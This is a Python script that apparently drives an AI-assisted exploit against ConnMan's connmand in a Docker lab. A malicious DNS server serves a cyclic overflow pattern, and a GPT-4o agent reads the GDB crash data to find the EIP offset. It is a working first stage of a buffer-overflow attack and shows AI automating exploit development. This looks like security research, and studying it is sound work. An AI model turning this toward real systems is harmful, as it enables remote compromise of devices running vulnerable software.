# main.py
import os
import time
import json
import socket
import struct
import argparse
import threading
import re
import subprocess
from dotenv import load_dotenv
from agent import ExploitAgent
from simple_dns import DNSServer

# Load environment variables from .env file
load_dotenv()

# --- GLOBAL CONFIGURATION ---
TARGET_HOST = os.getenv("TARGET_HOST", "buffcy_target")
GDB_PORT = int(os.getenv("GDB_PORT", 8080))
AGENT_IP = os.getenv("AGENT_IP", "172.20.0.10")
# --- END GLOBAL CONFIGURATION ---

class GDBClient:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.sock = None
        self.buffer = b""

    def connect(self):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        for i in range(15):
            try:
                self.sock.connect((self.host, self.port))
                print(f"[AGENT] Connected to GDB MCP Server at {self.host}:{self.port}.")
                return
            except ConnectionRefusedError:
                time.sleep(1)
        raise ConnectionRefusedError("Could not connect to GDB server after multiple attempts.")
    
    def send_command(self, method, params=None):
        if not self.sock: self.connect()
        request = {"jsonrpc": "2.0", "method": method, "params": params or {}, "id": 1}
        print(f"[AGENT] Sending command to server: {method}")
        self.sock.sendall(json.dumps(request).encode() + b'\n')
        
        while b'\n' not in self.buffer: self.buffer += self.sock.recv(4096)
        message_data, self.buffer = self.buffer.split(b'\n', 1)
        response = json.loads(message_data.decode())
        return response

    def close(self):
        if self.sock: self.sock.close()

def main(target_binary: str):
    print(f"***** AGENT STARTING EXPLOIT AGAINST: {target_binary} *****")
    agent = ExploitAgent(model_name="openai/gpt-4o")
    gdb_client = GDBClient(TARGET_HOST, GDB_PORT)
    
    payload_config = {'payload': b'DEFAULT_PAYLOAD'}
    dns_server = DNSServer(payload_config)
    dns_server.start()

    try:
        print("\n--- 🚀 PHASE 1: Finding EIP Offset ---")
        gdb_client.connect()
        
        pattern = agent.generate_cyclic_pattern(1200)
        payload_config['payload'] = pattern.encode('latin-1')
        print(f"[AGENT] Malicious DNS server configured with {len(pattern)}-byte cyclic pattern.")

        start_response = gdb_client.send_command('start_non_blocking')
        if start_response.get('status') != 'running':
            raise RuntimeError("Failed to start connmand in GDB.")
        
        print("[AGENT] connmand is now running with pre-baked configuration.")
        time.sleep(5) # Increased sleep for D-Bus and ConnMan initialization

        print(f"[AGENT] Verifying connectivity to DNS server on {AGENT_IP}:53 from target...")
        nc_check = subprocess.run(
            ["docker", "exec", "buffcy_target", "nc", "-zv", AGENT_IP, "53"],
            capture_output=True,
            text=True
        )
        print(f"[AGENT] Netcat check stdout from target:\n{nc_check.stdout}")
        print(f"[AGENT] Netcat check stderr from target:\n{nc_check.stderr}")

        if "succeeded" not in nc_check.stdout and "open" not in nc_check.stdout:
            print(f"--- ❌ FAILED: Netcat check to {AGENT_IP}:53 from target did not succeed. DNS server might not be reachable. ---")
            # Continue for now to see dig's full output, but this is a critical warning.

        print("[AGENT] Pinging agent IP from target to activate network, then sending dig command.")
        # Ping the agent's DNS server from the target, to ensure connectivity and ConnMan's active state
        subprocess.run(
            ["docker", "exec", "buffcy_target", "ping", "-c", "1", AGENT_IP],
            capture_output=True
        )
        
        # Then trigger the exploit with dig, directly querying the agent's DNS
        dig_result = subprocess.run(
            ["docker", "exec", "buffcy_target", "dig", f"@{AGENT_IP}", "dos.com", "+vc", "+noall", "+answer", "+nottl"],
            capture_output=True,
            text=True # Decode stdout/stderr as text
        )
        print(f"[AGENT] Dig command stdout from target:\n{dig_result.stdout}")
        print(f"[AGENT] Dig command stderr from target:\n{dig_result.stderr}")
        
        # THIS IS THE CRITICAL CHANGE: The 'check_for_crash' must happen AFTER the trigger
        print("[AGENT] Checking for crash report from GDB server after exploit trigger...")
        # Keep trying to check for a crash for a certain duration, as the crash might not be immediate
        crash_info = {'status': 'no_crash'}
        for _ in range(10): # Try checking for crash up to 10 times with a small delay
            crash_info = gdb_client.send_command('check_for_crash')
            if crash_info.get("status") == "crashed":
                break
            time.sleep(0.5) # Small delay between checks

        print(f"[AGENT] Received final response from server: {crash_info}")
        
        if crash_info.get("status") == "crashed":
            print("[AGENT] Crash confirmed. Engaging AI for analysis...")
            offset = agent.analyze_crash_and_get_offset(crash_info, len(pattern))
            print(f"\n--- ✅ SUCCESS: Agent determined offset is: {offset} ---")
        else:
            print(f"\n--- ❌ FAILED: Program did not crash as expected. ---")
            print(f"Final GDB Server Response: {crash_info}")

    except Exception as e:
        print(f"[AGENT] An error occurred during the exploit run: {e}")
    finally:
        gdb_client.close()
        # It's better to explicitly check if dns_server.sock is open before closing
        # as it might already be closed by DNSServer's own error handling.
        if dns_server.sock:
            dns_server.sock.close()
        print("\n🎉 Exploit sequence finished.")


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--target", required=True)
    args = parser.parse_args()
    main(args.target)